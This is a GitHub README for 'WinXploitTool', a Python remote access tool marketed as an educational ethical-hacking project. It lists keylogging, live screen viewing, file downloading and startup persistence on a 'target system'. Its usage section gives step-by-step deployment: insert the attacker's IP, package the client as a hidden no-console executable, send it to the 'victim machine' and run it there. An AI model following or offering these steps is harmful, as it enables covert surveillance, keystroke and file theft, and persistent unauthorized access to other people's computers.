# WinXploitTool - Advanced Ethical Hacking Toolkit

Welcome to the GitHub repository for WinXploitTool, an advanced ethical hacking tool built with Python.

## Overview
This repository contains the Python code used for educational purpose, showcasing the step-by-step process of creating a sophisticated Remote Access Tool for ethical hackers. WinXploitTool allows secure remote connections, keylogging, live screen sharing, and includes functionality for adding the executable to system startup.

## Features
- **Remote Connections:** Establish secure connections to target systems.
- **Keylogging:** Capture and log keystrokes on the target system.
- **Live Screen Sharing:** View the target system's screen in real-time.
- **File Downloading:** Download files from the target system.
- **Startup Integration:** Add the executable to system startup for persistent access.

## Requirements
- Python 3.x
- pip install vidstream
- pip install pynput
- pip install psutil
- pip install ttkthemes
- pip install pyinstaller
- pip install pywin32

## Usage
1. Clone the repository: `git clone https://github.com/RapidScripter/WinXploitTool.git`
2. Navigate to the project directory: `cd WinXploitTool`
3. Replace `Server_IP` with the attacker system's IP in `client.py` file.
4. Create an executable of `client.py`: `pyinstaller --onefile --noconsole client.py`
5. Start `server.py` as a listener.
6. Navigate to the `dist` directory: `cd dist`
7. Send the executable to the victim machine.
8. Run the executable on the victim machine.
9. Optionally, refer to the code in `startup.py` for adding the executable to system startup.

## Support
If you encounter any issues or have questions, feel free to open an [issue](https://github.com/RapidScripter/WinXploitTool/issues)

## Contribution
Contributions are welcome! If you have improvements or additional features, submit a pull request.

Happy hacking! 🌐🔒💡
